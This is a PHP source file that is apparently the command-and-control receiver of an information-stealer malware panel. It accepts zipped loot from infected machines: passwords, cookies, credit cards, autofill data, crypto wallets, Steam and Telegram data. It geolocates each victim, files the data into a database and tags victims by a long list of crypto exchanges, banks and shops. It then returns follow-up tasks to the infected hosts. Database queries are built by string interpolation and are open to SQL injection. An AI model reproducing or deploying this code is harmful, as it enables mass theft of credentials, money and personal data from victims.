<?php
//ini_set('display_errors', 'On');
//error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
ini_set("allow_url_fopen", true);
ini_set("upload_max_filesize", "255M");
ini_set("post_max_size", "255M");
ini_set("max_input_vars", "50000");
include 'database.php';




if (isset($_SERVER["HTTP_CF_CONNECTING_IP"]))
    $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];

if (isset($_SERVER["X-Forwarded-IP"]))
    $_SERVER['REMOTE_ADDR'] = $_SERVER["X-Forwarded-IP"];

if (isset($_SERVER["X-ProxyUser-Ip"]))
    $_SERVER['REMOTE_ADDR'] = $_SERVER["X-ProxyUser-Ip"];

if (isset($_SERVER["X-Real-IP"]))
    $_SERVER['REMOTE_ADDR'] = $_SERVER["X-Real-IP"];

$name = $_SERVER['REMOTE_ADDR'];
$data = file_get_contents('php://input');

if ($data) {
    if (!file_exists('tmp/'.$name)) {
        $file = fopen('tmp/'.$name, 'wb');
        fwrite($file, $data);
        fclose($file);
    } else {
        $fp = fopen('tmp/'.$name, 'ab');
        fwrite($fp, $data);
        fclose($fp);
    }
} else {
	//file_put_content('temp','sended');
    $temp = explode('~;^;', file_get_contents('tmp/'.$name));
    $hwid = $temp[0];
    unlink('tmp/'.$name);
    if(strlen($hwid)<6)die();
    $settings = $pdoConnection->query("SELECT * FROM `settings`")->fetch();
    $currentLog = $pdoConnection->query("SELECT COUNT(*) FROM logs WHERE hwid = '" . $hwid . "'")->fetchColumn(0);
    if ($settings[2] == 'on' && $currentLog >= 0 || $settings[2] == 'off' && $currentLog == 0) {
        $f = fopen('tmp/'.$name.'.zip', 'wb');
        fwrite($f, $temp[9]);
        fclose($f);
        $zip = new ZipArchive;
        $res = $zip->open('tmp/'.$name.'.zip');
        if ($res === TRUE) {
            $count = $temp[8];
            $aincrement = $pdoConnection->query("SHOW TABLE STATUS LIKE 'logs'")->fetch()['Auto_increment'];
            $hwidDir = $hwid . "_" . $aincrement;
            $os = $temp[1];
            $cookie = $temp[5];
            $pswd = $temp[3];
            $version = $temp[2];
            $cc = $temp[4];
            $wallet = $temp[7];
            $fileCount = 5; //ToDo
            $autofill = $temp[6];
            $userid = '4'; //ToDo
            $ip = $name;
            $date = time();
            $geolocationString = "IP : " . $ip . "\r\n";
            for ($crashes = 0; $crashes < 5; $crashes++) {
                try {
                    $loc = json_decode(file_get_contents('http://ip-api.com/json/' . $ip), true);
                    $country = $loc["country"];
                    $countryCode = $loc['countryCode'];
                    $geolocationString = $geolocationString . "Country Code : " . $loc['countryCode'] . "\r\n";
                    $geolocationString = $geolocationString . "Country : " . $loc['country'] . "\r\n";
                    $geolocationString = $geolocationString . "State Name : " . $loc['regionName'] . "\r\n";
                    $geolocationString = $geolocationString . "City : " . $loc['city'] . "\r\n";
                    $geolocationString = $geolocationString . "Timezone : " . $loc['timezone'] . "\r\n";
                    $geolocationString = $geolocationString . "ZIP : " . $loc['zip'] . "\r\n";
                    $geolocationString = $geolocationString . "ISP : " . $loc['isp'] . "\r\n";
                    $geolocationString = $geolocationString . "Coordinates : " . $loc['lat'] . " , " . $loc['lon'] . "\r\n\r\n";
                    break;
                } catch (Exception $e) {
                    $country = "ERROR";
                }
            }
            if ($country == "ERROR") {
                require_once("partials/GeoIP/geoip.php");
                $country = ip_name($ip);
                $countryCode = ip_code($ip);
                $geolocationString = $geolocationString . "Country Code : " . $countryCode . "\r\n";
                $geolocationString = $geolocationString . "Country : " . $country . "\r\n";
            }
            mkdir("logs/" . $hwidDir, 0777);
            file_put_contents("logs/".$hwidDir.'/geodata.log',$geolocationString);
            if ($settings[1] == "off") {
                if ($countryCode == "RU" || $countryCode == "KZ" || $countryCode == "UA" || $countryCode == "BY") {
                    if (!file_exists("logs/cislogs"))
                        mkdir("logs/cislogs", 0777);
                    mkdir("logs/cislogs/" . $hwidDir, 0777);
                    $zip->extractTo("logs/cislogs/" . $hwidDir);
                    $zip->close();
                    die();
                }
            }
            $zip->extractTo("logs/" . $hwidDir);
            $zip->close();
	    $steam = '0';
            if(file_exists("logs/" . $hwidDir."/Steam"))$steam = 1;
            unlink('tmp/'.$name.'.zip');
            $crypto = array('freewallet.org', 'paxful.com', 'capdax.com', 'wazirx.com', 'okex.com', 'bitfinex.com', 'hitbtc.com', 'kraken.com', 'gateio.io', 'bitstamp.net', 'bittrex.com', 'exmo', 'yobit', 'poloniex.com', 'bitflyer.jp', 'livecoin.net', 'wex.nz', 'cryptonator', 'mercatox.com', 'localbitcoins.com', 'localbitcoins.net', 'luno.', 'coinpayments', 'therocktrading.com', 'etherdelta.com', 'anxpro.com', 'c-cex.com', 'gatecoin.com', 'kiwi-coin.com', 'jubi.com', 'koineks.com', 'ecoin.cc', 'koinim.com', 'litebit.eu', 'lykke.com', 'mangr.com', 'localtrade.pro', 'lbank.info', 'leoxchange.com', 'liqui.io', 'kuna.io', 'fybse.se', 'freiexchange.com', 'fybsg.com', 'gatehub.net', 'getbtc.org', 'gemini.com', 'gdax.com', 'foxbit.com.br', 'foxbit.exchange', 'flowbtc.com.br', 'exx.com', 'exrates.me', 'excambriorex.com', 'ezbtc.ca', 'fargobase.com', 'fisco.co.uk', 'glidera.io', 'indacoin.com', 'ethexindia.com', 'indx.ru', 'infinitycoin.exchange', 'idex.su', 'idex.market', 'ice3x.com', 'ice3x.co.za', 'guldentrader.com', 'exchange.guldentrader.com', 'heatwallet.com', 'hypex.nl', 'negociecoins.com.br', 'topbtc.com', 'tidex.com', 'tidebit.com', 'tradesatoshi.com', 'urdubit.com', 'tuxexchange.com', 'tdax.com', 'spacebtc.com', 'surbitcoin.com', 'surbtc.com', 'usd-x.com', 'xbtce.com', 'yunbi.com', 'zyado.com', 'trade.z.com', 'zaif.jp', 'wavesplatform.com', 'walltime.info', 'vbtc.exchange', 'vaultoro.com', 'vircurex.com', 'virtacoinworld.com', 'vwlpro.com', 'nlexch.com', 'nevbit.com', 'nocks.com', 'novaexchange.com', 'nxtplatform.org', 'neraex.pro', 'mixcoins.com', 'mr-ripple.com', 'dsx.uk', 'nzbcx.com', 'okcoin.com', 'quadrigacx.com', 'quoinex.com', 'rightbtc.com', 'ripplefox.com', 'rippex.net', 'openledger.info', 'paymium.com', 'paribu.com', 'mercadobitcoin.com.br', 'dcexe.com', 'bitmex.com', 'bitmaszyna.pl', 'bitonic.nl', 'bitpanda.com', 'bitsblockchain.net', 'bitmarket.net', 'bitlish.com', 'bitfex.trade', 'bitexbook.com', 'bitex.la', 'bitflip.cc', 'bitgrail.com', 'bitkan.com', 'bitinka.com', 'bitholic.com', 'bitsane.com', 'changer.com', 'bitshares.org', 'btcmarkets.net', 'braziliex.com', 'btc-trade.com.ua', 'btc-alpha.com', 'bl3p.eu', 'bitssa.com', 'bitspark.io', 'bitso.com', 'bitstar.com', 'ittylicious.com', 'altcointrader.co.za', 'arenabitcoin', 'allcoin.com', 'abucoins.com', 'aidosmarket.com', 'aex.com', 'acx.com', 'bancor.network', 'bitbay.net', 'indodax.com', 'bitcointrade.com.br', 'bitcointoyou.com', 'bitbanktrade.jp', 'bitbank.com', 'big.one', 'bcex.ru', 'bitconnect.co', 'bisq.network', 'bit2c.co.il', 'bit-z.com', 'btcbear.com', 'btcbox.in', 'counterwallet.io', 'freewallet.io', 'indiesquare.me', 'rarepepewallet.com', 'coss.io', 'coolcoin.com', 'crex24.com', 'cryptex.net', 'coinut.com', 'coinsbank.com', 'coinsecure.in', 'coinsquare.com', 'coinsquare.io', 'coinspot.io', 'coinmarketcap.com', 'crypto-bridge.org', 'dcex.com', 'dabtc.com', 'decentrex.com', 'deribit.com', 'dgtmarket.com', 'cryptomkt.com', 'cryptoderivatives.market', 'cryptodao.com', 'cryptomate.co.uk', 'cryptox.pl', 'cryptopia.co.nz', 'coinroom.com', 'coinrate.net', 'chbtc.com', 'chilebit.net', 'coinbase.com', 'burst-coin.org', 'poloniex.com', 'btcc.', 'binance', 'btcc.net', 'btc-trade.com.ua', 'btctrade.im', 'btcturk.com', 'btcxindia.com', 'coincheck.com', 'coinmate.io', 'coingi.com', 'coinnest.co.kr', 'coinrail.co.kr', 'coinpit.io', 'coingather.com', 'coinfloor.co.uk', 'coinegg.com', 'coincorner.com', 'coinexchange.io', 'coinfalcon.com', 'digatrade.com', 'btc-alpha.com', 'blockchain', 'minergate', 'myetherwallet.com', 'litevault.net', 'dogechain.info', 'coinome', 'bitbns', 'btc.top', 'etherdelta.com', 'btcbank.com.ua', 'coindelta.com', 'depotwallet.com', 'kryptex.org');
            $game = array('steam', 'origin', 'ubi');
            $money = array('paypal', 'chase.com', 'TD', 'wells', 'capitalone', 'skrill', 'PayU');
            $shop = array('amazon', 'ebay', 'walmart', 'newegg', 'apple', 'bestbuy');
            $cookies = "logs/" . $hwidDir . "/" . "domains.log";
            $taskListXOR = "";
	    if(file_exists($cookies)){
            	$domains = file_get_contents($cookies);
	    }else{
		$domains = "";
	    }
            $r = $pdoConnection->query('SELECT * FROM presets')->fetchAll();
            $pres = "";
            foreach ($r as $row){
                $pattern = explode(';', $row['pattern']);
                if(contains($domains,$pattern)) {
                    $pres .= $row['name'] . ';';
                }
            }
	    if(strlen($pres) < 2){
		$pres = "None";
		}
           $res = $pdoConnection->exec("INSERT INTO `logs`(`id`, `userID`,`hwid`, `system`, `ip`, `country`, `date`, `count`, `cookie`, `pswd`, `buildversion`, `credit`, `autofill`, `wallets`, `comment`, `preset`,`steam`,`checked`) VALUES (null,'$userid','$hwid','$os','$ip','$countryCode',$date, $count, $cookie, $pswd, '$version',$cc, $autofill, $wallet,'','$pres','$steam','0')");


            //tasks+Presets
            $tasks = $pdoConnection->query("SELECT * FROM `tasks` ORDER BY `id` LIMIT 10");
            while ($task = $tasks->fetch(PDO::FETCH_ASSOC)) {
                if ($task["count"] == 0) {
                    $taskID = $task["id"];
                    $typePreset = $task['preset'];
                    if (checkTaskParams($hwid, $pswd, $cookie, $wallet, $cc, $task['params'])) {
                        continue;
                    }

                    if ($typePreset !== "all") {
                        $b = 0;
                        $presetsArray = $pdoConnection->query("SELECT id,color,pattern,name FROM `presets` WHERE name='$typePreset'")->fetch();
                        $siteFinded = explode(";", $presetsArray['pattern']);
                        foreach ($siteFinded as $key) {
                            if (file_exists("logs/" . $hwidDir . "/" . "passwords.log")) if (strripos(file_get_contents("logs/" . $hwidDir . "/" . "passwords.log"), $key) !== false) $b++;
                            if (file_exists("logs/" . $hwidDir . "/" . "domains.log")) if (strripos(file_get_contents("logs/" . $hwidDir . "/" . "domains.log"), $key) !== false) $b++;
                        }
                        if ($b == 0) continue;
                    }
                    if ($task["country"] == "*") {
                        $taskListXOR .= $task["task"] . "~;~";
                    } else {
                        $countries = explode(",", $task["country"]);
                        foreach ($countries as $_country) {
                            if ($_country == $loc['countryCode']) {
                                $taskListXOR .= $task["task"] . "~;~";
                            }
                        }
                    }
                } else if ($task["count"] > $task["status"]) {
                    $taskID = $task["id"];
                    $typePreset = $task['preset'];
                    if (checkTaskParams($hwid, $pswd, $cookie, $wallet, $cc, $task['params'])) continue;
                    if ($typePreset !== "all") {
                        $b = 0;
                        $presetsArray = $pdoConnection->query("SELECT id,color,pattern,name FROM `presets` WHERE name='$typePreset'")->fetch();
                        $siteFinded = explode("~;~", $presetsArray['pattern']);
                        foreach ($siteFinded as $key) {
                            if (file_exists("logs/" . $hwidDir . "/" . "passwords.log")) if (strripos(file_get_contents("logs/" . $hwidDir . "/" . "passwords.log"), $key) !== false) $b++;
                            if (file_exists("logs/" . $hwidDir . "/" . "domains.log")) if (strripos(file_get_contents("logs/" . $hwidDir . "/" . "domains.log"), $key) !== false) $b++;
                        }
                        if ($b == 0) continue;
                    }
                    if ($task["country"] == "*") {
                        $pdoConnection->exec("UPDATE `tasks` SET `status`=`status` + 1 WHERE `id`='$taskID'");
                        $taskListXOR .= $task["task"] . "~;~";
                    } else {
                        $countries = explode(",", $task["country"]);
                        foreach ($countries as $_country) {
                            if ($_country == $loc['countryCode']) {
                                $pdoConnection->exec("UPDATE `tasks` SET `status`=`status` + 1 WHERE `id`='$taskID'");
                                $taskListXOR .= $task["task"] . "~;~";
                            }
                        }
                    }
                }
            }
            echo $taskListXOR;
           // echo myxor($taskListXOR, $xorKey);
        } else {
            die();
        }
    }
}


    function checkTaskParams($hwid, $pswd, $cookie, $wallet, $cc, $params){
        $paramArray = explode(';', $params);
        $pass = $paramArray[0];
        $cookies = $paramArray[1];
        $wallets = $paramArray[2];
        $jabb = $paramArray[3];
        $tg = $paramArray[4];
        $ccParam = $paramArray[5];
        if ($pass == "on") {
            if ($pswd == 0) return true;
        }
        if ($cookies == "on") {
            if ($cookie == 0) return true;
        }
        if ($wallets == "on") {
            if ($wallet == 0) return true;
        }
        if ($jabb == "on") {
            $fname = "logs/" . $hwidDir . "/psi.log";
            if (!file_exists($fname)) return true;
            $fname = "logs/" . $hwidDir . "/psiplus.log";
            if (!file_exists($fname)) return true;
        }
        if ($tg == "on") {
            $fname = "logs/" . $hwidDir . "/Telegram";
            if (!file_exists($fname)) return true;
        }
        if ($ccParam == "on") {
            if ($cc == 0) return true;
        }
        return false;
    }

    function contains($string, Array $search, $caseInsensitive = false){
        $exp = '/' . implode('|', array_map('preg_quote', $search)) . ($caseInsensitive ? '/i' : '/');
        return preg_match($exp, $string) ? true : false;
    }

    function formatString($param)
    {
        $returnString = $param;
        $returnString = trim($returnString);
        $returnString = stripslashes($returnString);
        $returnString = htmlspecialchars($returnString);

        return $returnString;
    }

    function myxor($text, $key)
    {
        $outText = '';
        for ($i = 0; $i < strlen($text);) {
            for ($j = 0; $j < strlen($key); $j++, $i++) {
                $outText .= $text{$i} ^ $key{$j};
            }
        }
        return $outText;
    }

    function generateRandomString($length = 10)
    {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }
    ?>
